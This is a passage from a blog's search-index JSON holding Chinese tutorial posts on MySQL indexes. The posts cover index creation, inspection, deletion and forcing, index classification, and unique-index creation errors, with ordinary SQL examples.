①","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:4:2","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"四、索引应用篇总结 至此，MySQL索引应用篇，也就是索引中篇就结束了，相信大家认真看完本篇之后，对于索引的掌握性、熟练程度绝对会更上一层楼，因为本章中从索引的优劣分析，到建立索引的原则、索引失效的情景、使用索引的正确姿势、MySQL对于索引的优化机制等各方面，对索引进行了进一步阐述。 经历中、上两篇的阐述后，对于MySQL索引这个大体系已经建立出了完整的认知，下一篇就是《索引原理篇》啦，在中、上两篇中抛出了很多疑惑，都留在了索引原理篇中去分析，因为只有当你真正搞懂了索引的底层实现，才能更好的理解一些前面给出的建议、定论及概念。 当然，如果你认为我的文章对你有帮助，那可以动动发财的小手，点上一个免费的小赞赞~，点赞量足够多可加快《索引原理篇》的解锁进度，更文速度完全取决于诸位的点赞数量！当然，就算不给赞，《索引原理篇》也不会缺席噢！最后再给出两条关于索引的查询命令： show status like '%Handler_read%';查看当前会话的索引使用情况。 show global status like 'Handler_read%';：查询全局索引使用情况。 这两条命令在之后的《SQL调优篇》中会用到的，这些命令中的信息对于调优会有不小的参考价值，当然，对于详细的分析在后续的篇章中再详细讲解咯！ ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:5:0","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"(四)MySQL之索引初识篇：索引机制、索引分类、索引使用与管理综述 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:0:0","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"引言 由于MySQL是作为存储层部署在业务系统的最后端，所有的业务数据最终都要入库落盘，但随着一个项目在线上运行的时间越来越久，数据库中的数据量自然会越来越多，而数据体积出现增长后，当需要从表查询一些数据时，效率会越发低下。在正常情况下，表的查询性能和数据量是成反比的，也就是数据越多，查询越慢。 这是什么原因导致的呢？由于MySQL默认的查询方式导致的，举个例子~ SELECT * FROM `zz_student`; +------------+--------+------+--------+ | student_id | name | sex | height | +------------+--------+------+--------+ | 1 | 竹子 | 男 | 185cm | | 2 | 熊猫 | 女 | 170cm | | 3 | 子竹 | 男 | 182cm | | 4 | 棕熊 | 男 | 187cm | | 5 | 黑豹 | 男 | 177cm | | 6 | 脑斧 | 男 | 178cm | | 7 | 兔纸 | 女 | 165cm | +------------+--------+------+--------+ SELECT * FROM `zz_student` WHERE name = \"脑斧\"; 复制代码 上面给出了一张学生表，其中有七位学生信息，而此时要查询姓名为「脑斧」的学生信息时，MySQL底层是如何检索数据的呢？会触发磁盘IO，对表中的数据进行逐条读取并判断，也就是说，在这里想要查找到符合要求的数据，至少要经过六次磁盘IO才能检索到目标（暂且先不考虑局部性读取原理与随机IO）。 那假设这个表中有1000W条数据呢？要查的目标数据位于表的900W行以后怎么办？岂不是要触发几百万次磁盘IO才能检索到数据啊，如果真的这样去干，其效率大家可想而知。 在这种情况下，又该如何去提升数据库的查询性能呢？因为查询往往都是一个业务系统中最频繁的操作，一般项目的写/读请求比例都遵循三七定律，也就是30%的请求会涉及到写库操作，另外70%则属于查库类型的操作。 在思考如何提升查询性能前，咱们不妨先回想一下小时候的场景，小时候由于刚接触汉字，很多字都不认识，所以通常每个人小时候都会拥有一本「新华字典」，但一本字典那么厚，我们是一页页去翻的吗？并不是，字典中有目录索引，我们可以根据音节、偏旁等方式查找不认识的字。 在「新华字典」中一页页翻找某个汉字，就类似于我们前面给出的全表扫描方式，效率特别特别低，而通过目录索引则能够在很短的时间内找到目标汉字。 既然字典中都存在目录索引页，能帮助小时候的我们快速检索汉字，那这个思想能否应用到数据库中来呢？答案是当然可以，并且MySQL也提供了索引机制，索引是数据库中的核心组件之一，一张表中建立了合适的索引后，往往在面对海量数据查询时，能够事半功倍，接下来一起聊一聊MySQL的索引。 索引机制会分为上、中、下三篇进行阐述，大致内容如下： 《上篇：索引初识篇》主要讲解索引的概述、分类、使用与管理等； 《中篇：索引应用篇》主要阐述索引优劣分析、建立索引的原则、索引失效的场景、如何正确的使用索引、索引优化机制等； 《下篇：索引原理篇》则主要讲述索引的底层实现、B+Tree、Hash数据结构、聚簇索引和非聚簇索引实现、索引查询原理、索引管理实现等； ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:1:0","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"一、MySQL索引机制概述 对于MySQL索引机制的作用，经过上述「新华字典」的案例后可得知：索引就是用来帮助表快速检索目标数据的。此时先来简单回顾一下MySQL中索引是如何使用的呢？首先需要创建索引，MySQL可以通过CREATE、ALTER、DDL三种方式创建一个索引。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:2:0","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"1.1、MySQL索引的创建方式 ①使用CREATE语句创建 CREATE INDEX indexName ON tableName (columnName(length) [ASC|DESC]); 复制代码 这种创建方式可以给一张已存在的表结构添加索引，其中需要指定几个值： indexName：当前创建的索引，创建成功后叫啥名字。 tableName：要在哪张表上创建一个索引，这里指定表名。 columnName：要为表中的哪个字段创建索引，这里指定字段名。 length：如果字段存储的值过长，选用值的前多少个字符创建索引。 ASC|DESC：指定索引的排序方式，ASC是升序，DESC是降序，默认ASC。 当然，上述语句中的INDEX也可更改为KEY，作用都是创建一个普通索引，而对于其他的索引类型，这点在后续的索引分类中再聊。 ②使用ALTER语句创建 ALTER TABLE tableName ADD INDEX indexName(columnName(length) [ASC|DESC]); 复制代码 这里的参数都相同，所以不再重复赘述。 ③建表时DDL语句中创建 CREATE TABLE tableName( columnName1 INT(8) NOT NULL, columnName2 ...., ....., INDEX [indexName] (columnName(length)) ); 复制代码 这种方式就比较适合在库表设计时，已经确定了索引项的情况下建立。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:2:1","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"1.2、查询、删除、指定索引 但不管通过哪种方式建立索引，本质上创建的索引都是相同的，当索引创建完成后，可通过SHOW INDEX FROM tableName;这条命令查询一个表中拥有的索引，如下： CREATE TABLE `zz_user` ( `user_id` int(8) NOT NULL AUTO_INCREMENT, `user_name` varchar(255) NULL DEFAULT \"\", `user_sex` varchar(255) NULL DEFAULT \"\", `user_phone` varchar(255) NULL DEFAULT \"\", PRIMARY KEY (`user_id`) USING BTREE ) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact; 复制代码 在上述的建表SQL中，为user_id创建了一个主键索引，然后来查一下当前表的索引信息： 简单的概述一下查询后，每个字段的含义： ①Table：当前索引属于那张表。 ②Non_unique：目前索引是否属于唯一索引，0代表是的，1代表不是。 ③Key_name：当前索引的名字。 ④Seq_in_index：如果当前是联合索引，目前字段在联合索引中排第几个。 ⑤Column_name：当前索引是位于哪个字段上建立的。 ⑥Collation：字段值以什么方式存储在索引中，A表示有序存储，NULL表无序。 ⑦Cardinality：当前索引的散列程度，也就是索引中存储了多少个不同的值。 ⑧Sub_part：当前索引使用了字段值的多少个字符建立，NULL表示全部。 ⑨Packed：表示索引在存储字段值时，以什么方式压缩，NULL表示未压缩， ⑩Null：当前作为索引字段的值中，是否存在NULL值，YES表示存在。 ⑪Index_type：当前索引的结构（BTREE, FULLTEXT, HASH, RTREE）。 ⑫Comment：创建索引时，是否对索引有备注信息。 这条命令在后续排除问题、性能调优时，会有不小的作用，比如可以通过分析其中的Cardinality字段值，如果该值少于数据的实际行数，那目前索引有可能失效（对于这些后续排查篇和SQL优化篇再聊）。 OK~，到这里了解了一下索引相关的创建、查询命令，接着再看看删除、强制使用命令。 在MySQL中并未提供修改索引的命令，也就说当你建错了索引，只能先删再重新建立一次，删除索引的语句如下： DROP INDEX indexName ON tableName; 复制代码 当然，当建立了一条索引后，也可以强制性的为SELECT语句指定索引，如下： SELECT * FROM table_name FORCE INDEX(index_name) WHERE .....; 复制代码 FORCE INDEX关键字可以为一条查询语句强制指定走哪个索引查询，但要牢记的是：如果当前的查询SQL压根不会走指定的索引字段，哪这种方式是行不通的，这个关键字的用法是：一条查询语句在有多个索引可以检索数据时，显式指定一个索引，减少优化器选择索引的耗时。 但要注意：如果你对于你整个业务系统十分熟悉，那可以这样干。但如果不熟悉的话，还是交给优化器来自行选择，否则会适得其反！ ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:2:2","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"1.3、数据库索引的本质 前面一直在聊创建、查看、删除、指定等一些索引的基本操作，但索引本质上在数据库中是什么呢？大家都知道，数据库是基于磁盘工作的，所有的数据都会放到磁盘上存储，而索引也是数据的一种，因此与表数据相同，最终创建出的索引也会在磁盘生成本地文件。 不过索引文件在磁盘中究竟以何种方式存储，这是由索引的数据结构来决定的。同时，由于索引机制最终是由存储引擎实现，因此不同存储引擎下的索引文件，其保存在本地的格式也并不相同。 在这里有一个点需要注意：建立索引的工作在表数据越少时越好，如果你想要给一张百万、千万条数据级别的表新创建一个索引，那创建的耗时也不短，这是为什么呢？ 因为刚刚聊过，索引本质上和表是一样的，都是磁盘中的文件，那也就代表着创建一个索引，并不像单纯的给一张表加个约束那么简单，而是会基于原有的表数据，重新在磁盘中创建新的本地索引文件。假设表中有一千万条数据，那创建索引时，就需要将索引字段上的1000W个值全部拷贝到本地索引文件中，同时做好排序并与表数据产生映射关系。 OK~，至此就对MySQL提供的索引机制做了简单回顾，下面再来说说数据库中“多样化”的索引类型。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:2:3","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"二、MySQL的索引分类 在前面我为什么用多样化去形容数据库索引呢？因为确实如此，先列一些大家都听说过的索引称呼：聚簇索引、非聚簇索引、唯一索引、主键索引、联合索引、全文索引、单列索引、多列索引、复合索引、普通索引、二级索引、辅助索引、次级索引、有序索引、B+Tree索引、R-Tree索引、T-Tree索引、Hash索引、空间索引、前缀索引…… 是不是看的眼花缭乱，这些都是MySQL中索引的一些称呼，一通看下来，估计大家看“索引”两个字都有点不认识了^_^ 但实际上MySQL中真的有这么多索引类型吗？其实并没有，上述列出的索引称呼中，有几个称呼对应的索引是同一个，有一部分只是逻辑上的索引，那索引究竟该如何分类呢？其实从不同的层面上来说，可以将索引划分为不同的类型，接下来重点聊一聊。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:3:0","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"2.1、数据结构层次 前面聊索引本质的时候提到过，索引建立后也会在磁盘生成索引文件，那每个具体的索引节点该如何在本地文件中存放呢？这点是由索引的数据结构来决定的。比如索引的底层结构是数组，那所有的索引节点都会以Node1→Node2→Node3→Node4....这样的形式，存储在磁盘同一块物理空间中，不过MySQL的索引不支持数组结构，或者说数组结构不适合作为索引结构，MySQL索引支持的数据结构如下： B+Tree类型：MySQL中最常用的索引结构，大部分引擎支持，有序。 Hash类型：大部分存储引擎都支持，字段值不重复的情况下查询最快，无序。 R-Tree类型：MyISAM引擎支持，也就是空间索引的默认结构类型。 T-Tree类型：NDB-Cluster引擎支持，主要用于MySQL-Cluster服务中。 在上述的几种索引结构中，B+树和哈希索引是最常见的索引结构，几乎大部分存储引擎都实现了，对于后续两种索引结构在某些情况下也较为常见，但除开列出的几种索引结构外，MySQL索引支持的数据结构还有R+、R*、QR、SS、X树等结构。 但为何后续的一些索引结构大家没听说过呢？这是因为索引到底支持什么数据结构，这是由存储引擎决定的，不同的存储引擎支持的索引结构也并不同，目前较为常用的引擎就是MyISAM、InnoDB，因此大家未曾听说后面列出的这些索引结构也是正常的。 当然，也正因为索引结构由存储引擎决定，而MySQL引擎层在《MySQL架构篇》中提到过，属于可拔插式引擎，所以如果你有能力自己实现一个引擎，那你甚至可以让引擎的索引机制支持任何数据结构。 在MySQL中创建索引时，其默认的数据结构就为B+Tree，如何更换索引的数据结构呢？如下： CREATE INDEX indexName ON tableName (columnName(length) [ASC|DESC]) USING HASH; 复制代码 也就是在创建索引时，通过USING关键字显示指定索引的数据结构（必须要为当前引擎支持的结构）。 同时索引会被分为有序索引和无序索引，这是指索引文件中存储索引节点时，会不会按照字段值去排序。那一个索引到底是有序还是无序，就是依据数据结构决定的，例如B+Tree、R-Tree等树结构都是有序，而哈希结构则是无序的。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:3:1","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"2.2、字段数量层次 前面从索引的数据结构层次出发，可以将索引分为不同结构的类型，而从表字段的层次来看，索引又可以分为单列索引和多列索引，这两个称呼也比较好理解，单列索引是指索引是基于一个字段建立的，多列索引则是指由多个字段组合建立的索引。 单列索引也会分为很多类型，比如： 唯一索引：指索引中的索引节点值不允许重复，一般配合唯一约束使用。 主键索引：主键索引是一种特殊的唯一索引，和普通唯一索引的区别在于不允许有空值。 普通索引：通过KEY、INDEX关键字创建的索引就是这个类型，没啥限制，单纯的可以让查询快一点。 …..还有很多很多，只要是基于单个字段建立的索引都可以被称为单列索引。 多列索引的概念前面解释过了，不过它也有很多种叫法，例如： 组合索引、联合索引、复合索引、多值索引…. 但不管名称咋变，描述的含义都是相同的，即由多个字段组合建立的索引。 不过在使用多列索引时要注意：当建立多列索引后，一条SELECT语句，只有当查询条件中了包含了多列索引的第一个字段时，才能使用多列索引，下面举个栗子。 比如在用户表中，通过id、name、age三个字段建立一个多列索引，什么情况下会使用索引，什么时候不会呢？如下： -- 无法使用多列索引的SQL语句 SELECT * FROM `zz_user` WHERE name = \"竹子\" AND age = \"18\"; -- 能命中多列索引的SQL语句 SELECT * FROM `zz_user` WHERE name = \"竹子\" AND id = 6; 复制代码 OK，到这里就根据字段数量的层面出发，简单讲明了单列和多列索引的概念，但无论是单列还是多列，都可以存在一个前缀索引的概念，啥叫前缀索引呢？还记得创建索引时指定的length字段吗？ length：如果字段存储的值过长，选用值的前多少个字符创建索引。 使用一个字段值中的前N个字符创建出的索引，就可以被称为前缀索引，前缀索引能够在很大程度上，节省索引文件的存储空间，也能很大程度上提升索引的性能，这是为什么呢？后面分析索引实现原理的时候细聊。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:3:2","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"2.3、功能逻辑层次 相信大家在面试时，如果问到了MySQL索引机制，相信一定会问如下这道面试题： 请回答一下你知道的MySQL索引类型。 这题的答案该怎么回答呢？其实主要就是指MySQL索引从逻辑上可以分为那些类型，以功能逻辑划分索引类型，这也是最常见的划分方式，从这个维度来看主要可划分为五种： 普通索引、唯一索引、主键索引、全文索引、空间索引 对于普通索引、唯一索引、主键索引都介绍过了，就不再过多阐述，但稍微提一嘴，在主键字段上建立的索引被称为主键索引，非主键字段上建立的索引一般被称为辅助索引或、二级索引或次级索引，接着重点聊一下全文索引和空间索引。 全文索引和空间索引都是MySQL5.7版本后开始支持的索引类型，不过这两种索引都只有MyISAM引擎支持，其他引擎要么我没用过，要么就由于自身实现的原因不支持，例如InnoDB。对于全文索引而言，其实在MySQL5.6版本中就有了，但当时并不支持汉字检索，到了5.7.6版本的时候才内嵌ngram全文解析器，才支持亚洲语种的分词，同时InnoDB引擎也开始支持全文索引，在5.7版本之前，只有MyISAM引擎支持。 全文索引 全文索引类似于ES、Solr搜索中间件中的分词器，或者说和之前常用的like+%模糊查询很类似，它只能创建在CHAR、VARCHAR、TEXT等这些文本类型字段上，而且使用全文索引查询时，条件字符数量必须大于3才生效。当然，还是举个栗子才有感觉： +------------+--------------------------------------------+------------------+ | article_id | article_name | special_column | +------------+--------------------------------------------+------------------+ | 1 | MySQL架构篇：自顶向下深入剖析MySQL整体架构 | 《全解MySQL》 | | 2 | MySQL执行篇：一条SQL语句从诞生至结束的历程 | 《全解MySQL》 | | 3 | MySQL设计篇：数据库六范式与反范式设计准则！| 《全解MySQL》 | | 4 | MySQL索引篇：索引概述、分类及建立索引的原则| 《全解MySQL》 | +------------+--------------------------------------------+------------------+ 复制代码 比如现在用户想要搜索一篇文章，但是忘记文章全称了，只记得「诞生至结束」这个词汇，此时用户搜索这个词汇，走全文索引的情况下，照样能够定位到上表中的第二条记录。 当然，全文索引如何创建与使用，待会儿后面一起列出来。 空间索引 空间索引这玩意儿其实用的不多，至少大部分项目的业务中不会用到，想要弄清楚空间索引，那么首先得知道一个概念：GIS空间数据，GIS是什么意思呢？是地理信息系统，这是一门新的学科，基于了计算机、信息学、地理学等多科构建的，主要就是用于管理地理信息的数据结构，在国土、规划、出行、配送、地图等和地理有关的项目中，应用较为频繁。 地理空间数据主要包含矢量数据、3D模型、影像文件、坐标数据等，说简单点，空间数据也就是可以将地理信息以模型的方式，在地图上标注出来。在MySQL中总共支持GEOMETRY、POINT、LINESTRING、POLYGON四种空间数据类型，而空间索引则是基于这些类型的字段建立的，也就是可以帮助我们快捷检索空间数据。 不过对于空间索引，一般用的较少，大家了解即可。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:3:3","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"2.4、存储方式层次 上面聊完了三种不同层次的索引划分后，接着从存储方式的层面再聊聊，从存储方式来看，MySQL的索引主要可分为两大类： 聚簇索引：也被称为聚集索引、簇类索引 非聚簇索引：也叫非聚集索引、非簇类索引、二级索引、辅助索引、次级索引 重点说一说这两类索引存储方式的区别，在说之前先回忆一下数组和链表的区别： 数组是物理空间上的连续，存储的所有元素都会按序存放在同一块内存区域中。 链表是逻辑上的连续，存储的所有元素可能不在同一块内存，元素之间以指针连接。 为啥要说这个呢？因为聚簇索引和非聚簇索引的区别也大致是相同的： 聚簇索引：逻辑上连续且物理空间上的连续。 非聚簇索引：逻辑上的连续，物理空间上不连续。 当然，这里的连续和数组不同，因为索引大部分都是使用B+Tree结构存储，所以在磁盘中数据是以树结构存放的，所以连续并不是指索引节点，而是指索引数据和表数据，也就是说聚簇索引中，索引数据和表数据在磁盘中的位置是一起的，而非聚簇索引则是分开的，索引节点和表数据之间，用物理地址的方式维护两者的联系。 不过一张表中只能存在一个聚簇索引，一般都会选用主键作为聚簇索引，其他字段上建立的索引都属于非聚簇索引，或者称之为辅助索引、次级索引。但也不要走进一个误区，虽然MySQL默认会使用主键上建立的索引作为聚簇索引，但也可以指定其他字段上的索引为聚簇索引，一般聚簇索引要求索引必须是非空唯一索引才行。 其实就算表中没有定义主键，InnoDB中会选择一个唯一的非空索引作为聚簇索引，但如果非空唯一索引也不存在，InnoDB隐式定义一个主键来作为聚簇索引。 当然，主键或者说聚簇索引，一般适合采用带有自增性的顺序值。 对于聚簇、非聚簇索引的区别、两者的查找过程、隐式主键、为何主键适合自增值等这些问题，在后续的《索引原理篇》中会详细讲解。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:3:4","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"2.5、索引分类小结 至此，对于MySQL“多样化”的索引机制，一大堆索引名词，就已经梳理清楚啦！相信到这里为止，大家也对MySQL的索引机制有了系统化的认知，其实最开始给出的一大堆索引名词，只是从不同角度划分出来的，在上述中分别从数据结构、字段数量、功能逻辑以及存储方式多个层面进行了描述。当然，要牢记的是，以功能逻辑的层次来划分索引，这也是最常用的方式。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:3:5","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"三、MySQL其他索引的创建使用方式 前面的案例中，聊到了咱们有三种方式创建索引，在创建时可通过INDEX、KEY两个关键字创建，但这种方式建立的索引仅是普通索引，接着再来聊一聊MySQL数据库其他类型的索引该如何创建以及使用。 但不管是何种类型的索引，都可以通过前面聊到的三种方式创建。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:4:0","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"3.1、唯一索引的创建与使用 唯一索引在创建时，需要通过UNIQUE关键字创建：如下： -- 方式① CREATE UNIQUE INDEX indexName ON tableName (columnName(length)); -- 方式② ALTER TABLE tableName ADD UNIQUE INDEX indexName(columnName); -- 方式③ CREATE TABLE tableName( columnName1 INT(8) NOT NULL, columnName2 ...., ....., UNIQUE INDEX [indexName] (columnName(length)) ); 复制代码 在已有的表基础上创建唯一索引时要注意，如果选用的字段，表中字段的值存在相同值时，这时唯一索引是无法创建的，比如： SELECT * FROM `zz_article`; +------------+--------------------------+-------------------+ | article_id | article_name | special_column | +------------+--------------------------+-------------------+ | 1 | MySQL架构篇：....... | 《全解MySQL》 | | 2 | MySQL执行篇：....... | 《全解MySQL》 | | 3 | MySQL设计篇：....... | 《全解MySQL》 | | 4 | MySQL索引篇：....... | 《全解MySQL》 | | 5 | MySQL索引篇：....... | 《全解MySQL》 | +------------+--------------------------+-------------------+ CREATE UNIQUE INDEX i_article_name ON zz_article (article_name); 复制代码 比如上述文章表中，第4、5条数据是重复的，此时创建利用SQL语句创建唯一索引，就会抛出1062错误码： ERROR 1062 (23000): Duplicate entry 'MySQL索引篇：.......' for key 'i_article_name' 复制代码 在这种情况下，就只能先删除重复数据，然后才能创建唯一索引成功。 同时，当唯一索引创建成功后，它同时会对表具备唯一约束的作用，当再使用INSERT语句插入相同值时，会同样会抛出1062错误码： INSERT INTO `zz_article` VALUES(6,\"MySQL索引篇：.......\",\"《全解MySQL》\"); 1062 - Duplicate entry 'MySQL索引篇：.......' for key 'i_article_name' 复制代码 这里会提示你插入的哪个值，已经在表中存在，因此无法插入当前这条数据。 